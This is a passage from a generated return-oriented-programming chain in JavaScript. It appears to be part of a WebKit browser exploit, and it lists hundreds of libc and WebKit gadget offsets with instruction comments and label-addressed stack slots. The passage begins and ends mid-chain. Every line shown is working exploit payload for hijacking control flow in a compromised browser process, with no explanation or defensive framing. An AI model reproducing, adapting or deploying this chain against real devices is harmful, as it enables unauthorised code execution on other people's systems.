libc_base+764760, //pop rsi
ropchain+1090176, //L1066
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1090232, //L1067
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1067:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1090312, //L1069
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1069:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1070:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1071:
db([20, 0]); // 0x14
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1090424, //L1072
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1090440, //L1073
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1072:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1090528, //L1075
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1075:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1090584, //L1076
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1076:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1090656, //L1079
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1090712, //L1080
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1080:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1082:
libc_base+763368, //pop rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1090864, //L1084
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1083:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1084:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1090952, //L1086
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1090968, //L1087
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1086:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1091112, //L1091
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1091080, //L1089
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1091096, //L1090
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1089:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1090:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1091:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1091184, //L1093
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1093:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1091240, //L1094
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1094:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1091320, //L1096
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1096:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1097:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1098:
db([21, 0]); // 0x15
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1091432, //L1099
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1091448, //L1100
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1099:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1100:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1091536, //L1102
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1102:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1091592, //L1103
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1103:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1091664, //L1106
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1106:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1091720, //L1107
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1107:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1091824, //L1110
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1109:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L1110:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1091912, //L1112
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1091928, //L1113
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1112:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1113:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1092072, //L1117
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1092040, //L1115
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1092056, //L1116
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1115:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1116:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1117:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1092144, //L1119
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1119:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1092200, //L1120
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1120:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1092280, //L1122
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1122:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1123:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1124:
db([6, 0]); // 0x6
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1092392, //L1125
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1092408, //L1126
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1125:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1092496, //L1128
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1092552, //L1129
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1129:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1092672, //L1132
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1131:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1132:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1092760, //L1134
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1092776, //L1135
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1134:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1135:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1092920, //L1139
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1092888, //L1137
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1092904, //L1138
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1137:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1138:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1139:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1092992, //L1141
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1093048, //L1142
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1142:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1093128, //L1144
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1144:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1145:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1146:
db([22, 0]); // 0x16
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1093240, //L1147
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1093256, //L1148
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1147:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1148:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1093344, //L1150
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1150:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1093400, //L1151
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1151:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1093472, //L1154
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1093528, //L1155
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1155:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1157:
libc_base+533450, //mov [rcx], rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1093680, //L1159
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1158:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1159:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1093768, //L1161
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1093784, //L1162
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1161:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1162:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1093928, //L1166
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1093896, //L1164
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1093912, //L1165
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1164:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1165:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1166:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1094000, //L1168
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1168:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1094056, //L1169
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1169:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1094136, //L1171
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1171:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1172:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1173:
db([23, 0]); // 0x17
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1094248, //L1174
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1094264, //L1175
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1174:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1094352, //L1177
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1177:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1094408, //L1178
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1178:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1094480, //L1181
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1181:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1094536, //L1182
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1182:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1184:
libc_base+144605, //pop rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1094688, //L1186
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1185:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1186:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1094776, //L1188
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1094792, //L1189
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1188:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1189:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1094936, //L1193
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1094904, //L1191
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1094920, //L1192
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1191:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1192:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1193:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1095008, //L1195
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1195:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1095064, //L1196
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1196:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1095144, //L1198
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1198:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1199:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1200:
db([24, 0]); // 0x18
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1095256, //L1201
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1095272, //L1202
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1201:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1202:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1095360, //L1204
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1204:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1095416, //L1205
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1205:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1095488, //L1208
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1208:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1095544, //L1209
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1209:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1095648, //L1212
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1211:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L1212:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1095736, //L1214
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1095752, //L1215
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1214:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1215:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1095896, //L1219
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1095864, //L1217
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1095880, //L1218
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1217:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1218:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1219:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1095968, //L1221
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1221:
db([0, 0]); // 0x0
set_gadgets([
